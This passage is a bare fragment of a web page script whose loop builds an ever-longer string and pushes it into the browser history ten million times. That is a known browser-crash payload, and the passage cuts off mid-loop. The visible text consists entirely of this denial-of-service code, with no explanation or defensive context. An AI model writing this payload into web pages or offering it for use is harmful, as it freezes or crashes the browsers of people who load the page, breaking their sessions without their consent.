 <script>
      var total = "";
      for( var i = 0; i < 10000000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
